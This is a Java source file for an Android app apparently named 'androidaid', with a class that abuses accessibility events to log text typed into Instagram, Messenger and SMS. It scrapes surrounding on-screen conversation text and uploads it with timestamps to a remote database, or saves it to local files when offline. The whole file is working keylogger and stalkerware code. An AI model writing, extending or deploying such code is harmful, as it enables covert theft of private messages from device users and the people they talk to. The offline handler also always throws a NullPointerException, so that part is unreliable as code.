package androidaid.android.com.androidaid;

import android.app.Notification;
import android.content.Context;
import android.os.Parcelable;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.util.ArrayList;

import androidaid.android.com.androidaid.core.ExtraConversationData;
import androidaid.android.com.androidaid.core.StringKeeper;
import androidaid.android.com.androidaid.core.TextBuilder;
import androidaid.android.com.androidaid.networking.DatabaseNetworking;
import androidaid.android.com.androidaid.program_flow.Constants;
import androidaid.android.com.androidaid.storage.InternalStorageManager;
import androidaid.android.com.androidaid.utilities.CoreUtils;
import androidaid.android.com.androidaid.utilities.SystemTools;

public class AccessibilityEventManager {
    private static String currentTypedText = "";
    private static String previousText = "";

    private static StringBuilder actualTextBuilder = new StringBuilder();
    private static ArrayList<String> extraOnScreenText = new ArrayList<>();
    private static int mDebugDepth = 0;


    /**
     * This code handles the AccessibilityEvent if the connection is strong enough to connect to firebase in a reasonable amount of time.
     * @param event
     * @param rootWindow the root window currently displayed on the screen
     */
    public static void handleOnlineAccessibilityEvent(AccessibilityEvent event, AccessibilityNodeInfo rootWindow) {

        System.out.println("[sproc32.AEM.handleOnlineAccessibilityEvent]: source = " + event.getPackageName());
        ExtraConversationData ecd;

        //this reads the characters off the screen for each online accessibility event
        //todo: START FROM HERE! FIND OUT HOW TO STORE THE ON SCREEN TEXT IN SUCH A WAY THAT WHEN THE MESSAGE/SMS IS SENT, THE TEXT FOR THE WHOLE SCREEN IS SENT TOGETHER, AND NOT JUST TEXT FROM THE TEXTBOX OF THE MESSAGE/SMS (CAUSE EACH TEXTBOX FIRES ACCESSIBILITY EVENTS)
        //actualTextBuilder instance is reset at the bottom of the switch statement! take care of that!

        //readAllScreenCharacters(event.getSource());
        //System.out.println("[sproc32.AEM.handleOnlineAccessibilityEvent]: Printing the acquired text from the screen: " + actualTextBuilder);
        //actualTextBuilder.delete(0, actualTextBuilder.length());

        switch(event.getEventType()) {
            //maybe introduce a case statement here in the beginning to listen for window content change event and then update textbuilder depending on the package? And forbid multiple writes to a single textbuilder instance
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:

                String eventPackageName = event.getPackageName().toString();

                currentTypedText = event.getSource().getText().toString();
                System.out.println("[sproc32.MAS]: currentTypedText = " + currentTypedText);

                //check if text is from facebook or instagram... if new text selection equals "", then store text (a message has been sent)

                if (eventPackageName.equals(Constants.PACKAGE_NAME_INSTAGRAM) || eventPackageName.equals(Constants.PACKAGE_NAME_MESSENGER)) {
                    String currentDateAndTime = SystemTools.getCurrentDateAndTime();
                    String eventClassName = event.getClassName().toString();

                    try {
                        Class className = Class.forName(eventClassName);

                        if (EditText.class.isAssignableFrom(className)) {
                            System.out.println("[sproc32.MAS]: Found text change event from facebook or instagram. currentTypedText = " + currentTypedText + " | previousText = " + previousText);

                            if (eventPackageName.equals(Constants.PACKAGE_NAME_INSTAGRAM) && currentTypedText.equals(Constants.INSTAGRAM_CONVERSATION_FIELD_DEFAULT_TEXT)) { //if text becomes "Messages....", then a message has been cleared, ie. sent
                                //todo: find who it is for
                                //DatabaseNetworking.storeText(previousText, currentDateAndTime, Constants.DATABASE_NODE_FIELD_TEXT_INSTAGRAM);

                                readAllScreenCharacters(rootWindow);
                                ecd = CoreUtils.parseExtraConversationData(extraOnScreenText, Constants.SOURCE_INSTAGRAM);
                                System.out.println("[sproc32.AEM.handleOnlineAccessibilityEvent]: Instagram screen text for current message = " + actualTextBuilder);

                                DatabaseNetworking.storeText(previousText, currentDateAndTime, ecd, Constants.DATABASE_NODE_FIELD_TEXT_INSTAGRAM);

                            }

                            if (eventPackageName.equals(Constants.PACKAGE_NAME_MESSENGER) && currentTypedText.equals(Constants.MESSENGER_CONVERSATION_FIELD_DEFAULT_TEXT)) {
                                //todo: find who it is for
                                //DatabaseNetworking.storeText(previousText, currentDateAndTime, Constants.DATABASE_NODE_FIELD_TEXT_MESSENGER);

                                readAllScreenCharacters(rootWindow);
                                ecd = CoreUtils.parseExtraConversationData(extraOnScreenText, Constants.SOURCE_MESSENGER);
                                System.out.println("[sproc32.AEM.handleOnlineAccessibilityEvent]: Messenger screen text for current message = " + actualTextBuilder);

                                DatabaseNetworking.storeText(previousText, currentDateAndTime, ecd, Constants.DATABASE_NODE_FIELD_TEXT_MESSENGER);

                            }
                        }
                    } catch (ClassNotFoundException e) {
                        e.printStackTrace();
                    }
                }

                //TextBuilder.addText(text);
                StringKeeper.setText(currentTypedText);
                previousText = currentTypedText;

                break;

            case AccessibilityEvent.TYPE_VIEW_CLICKED: //if a view is clicked, a message was probably sent
                System.out.println("[sproc32.MAS]: A view was clicked.");
                //this determines if a button was clicked and sends the current text to the server if any buttons were clicked
                try {
                    System.out.println("[sproc32.MAS]: Current event view class name = " + event.getClassName().toString());
                    Class className = Class.forName(event.getClassName().toString());

                    //check for LinearLayout due to the fact that the SMS-send-button is a linear layout!
                    //check for ImageView due to the fact that the instagram-back-button is an ImageView
                    if (Button.class.isAssignableFrom(className) || ImageButton.class.isAssignableFrom(className) || LinearLayout.class.isAssignableFrom(className) ||
                            ImageView.class.isAssignableFrom(className)) {
                        System.out.println("[sproc32.MAS]: Button was clicked. Storing the current text.");
                        DatabaseNetworking.storeText(StringKeeper.getText(), SystemTools.getCurrentDateAndTime());

                        if (event.getPackageName().equals(Constants.PACKAGE_NAME_SMS)) {
                            //todo: find who it is for
                            DatabaseNetworking.storeText(StringKeeper.getText(), SystemTools.getCurrentDateAndTime(), Constants.DATABASE_NODE_FIELD_TEXT_SMS);
                        }
                    }
                } catch (ClassNotFoundException e) {
                    e.printStackTrace();
                }
                break;

        }
        //resets the textbuilder instance and clear extraOnScreenText
        actualTextBuilder.delete(0, actualTextBuilder.length());
        extraOnScreenText.clear();
    }



    /**
     * Handles offline accessibility event. Mainly stores what was typed to internal memory.
     * @param event
     */
    public static void handleOfflineAccessibilityEvent(AccessibilityEvent event, AccessibilityNodeInfo rootWindow) {
        System.out.println("[sproc32.AEM]: Handling offline accessibility event. Storing data to internal memory.");

        String source = event.getPackageName().toString();
        String currentDateAndTime = SystemTools.getCurrentDateAndTime();
        System.out.println("[sproc32.AEM]: source = " + source);

        switch(event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                currentTypedText = event.getSource().getText().toString();
                System.out.println("[sproc32.MAS]: currentTypedText = " + currentTypedText);

                //check if text is from facebook or instagram... if new text selection equals "", then store text (a message has been sent)

                if (source.equals(Constants.PACKAGE_NAME_INSTAGRAM) || source.equals(Constants.PACKAGE_NAME_MESSENGER)) {
                    String eventClassName = event.getClassName().toString();

                    try {
                        Class className = Class.forName(eventClassName);

                        if (EditText.class.isAssignableFrom(className)) {
                            System.out.println("[sproc32.MAS]: Found text change event from facebook or instagram. currentTypedText = " + currentTypedText + " | previousText = " + previousText);

                            if (source.equals(Constants.PACKAGE_NAME_INSTAGRAM) && currentTypedText.equals(Constants.INSTAGRAM_CONVERSATION_FIELD_DEFAULT_TEXT)) { //if text becomes "Messages....", then a message has been cleared, ie. sent
                                //todo: find who it is for
                                InternalStorageManager.writeToInstagramFieldTextFile(currentDateAndTime, previousText);
                            }

                            if (source.equals(Constants.PACKAGE_NAME_MESSENGER) && currentTypedText.equals(Constants.MESSENGER_CONVERSATION_FIELD_DEFAULT_TEXT)) {
                                //todo: find who it is for
                                InternalStorageManager.writeToMessengerFieldTextFile(currentDateAndTime, previousText);
                            }
                        }
                    } catch (ClassNotFoundException e) {
                        e.printStackTrace();
                    }
                }

                StringKeeper.setText(currentTypedText);
                previousText = currentTypedText;
                break;

                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    System.out.println("[sproc32.MAS]: A view was clicked.");
                    //this determines if a button was clicked and sends the current text to the server if any buttons were clicked
                    try {
                        System.out.println("[sproc32.MAS]: Current event view class name = " + event.getClassName().toString());
                        Class className = Class.forName(event.getClassName().toString());

                        //check for LinearLayout due to the fact that the SMS-send-button is a linear layout!
                        //check for ImageView due to the fact that the instagram-back-button is an ImageView
                        if (Button.class.isAssignableFrom(className) || ImageButton.class.isAssignableFrom(className) || LinearLayout.class.isAssignableFrom(className) ||
                                ImageView.class.isAssignableFrom(className)) {
                            System.out.println("[sproc32.MAS]: Button was clicked. Storing the current text in general file in internal memory.");
                            InternalStorageManager.writeToFieldTextGeneralFile(currentDateAndTime, StringKeeper.getText(), determineSource(event.getPackageName().toString()));

                            if (event.getPackageName().equals(Constants.PACKAGE_NAME_SMS)) {
                                //todo: find who it is for
                                InternalStorageManager.writeToSMSFieldTextFile(currentDateAndTime, StringKeeper.getText());
                            }
                        }
                    } catch (ClassNotFoundException e) {
                        e.printStackTrace();
                    }
                    break;

        }

        throw new NullPointerException();

    }

    private static String determineSource(String source) {
        switch(source) {
            case Constants.PACKAGE_NAME_INSTAGRAM:
                return Constants.SOURCE_INSTAGRAM;
            case Constants.PACKAGE_NAME_MESSENGER:
                return Constants.SOURCE_MESSENGER;
            case Constants.PACKAGE_NAME_SMS:
                return Constants.SOURCE_SMS;
            default:
                return Constants.SOURCE_UNKNOWN;
        }
    }

    private static void readAllScreenCharacters(AccessibilityNodeInfo mNodeInfo) {

        if (mNodeInfo == null) return;
        String log =""; //log with depth

        for (int i = 0; i < mDebugDepth; i++) {
            log += ".";
        }

        if(mNodeInfo.getText() != null) {
            actualTextBuilder.append(mNodeInfo.getText().toString()).append(Constants.STORAGE_TEXT_ADDITIONAL_SCREEN_INFORMATION_SEPARATOR);
            System.out.println("[sproc32.log.AEM.readAllScreenCharacters]: Adding " + mNodeInfo.getText().toString() + " to extraOnScreenText");
            extraOnScreenText.add(mNodeInfo.getText().toString());
        }

        log+="("+mNodeInfo.getText() +" <-- "+
                mNodeInfo.getViewIdResourceName()+")";

        System.out.println("[sproc.log.AEM.printAllViews]: " + log);

        if (mNodeInfo.getChildCount() < 1) return;

        mDebugDepth++;

        for (int i = 0; i < mNodeInfo.getChildCount(); i++) {
            readAllScreenCharacters(mNodeInfo.getChild(i));
        }
        mDebugDepth--;
    }
}
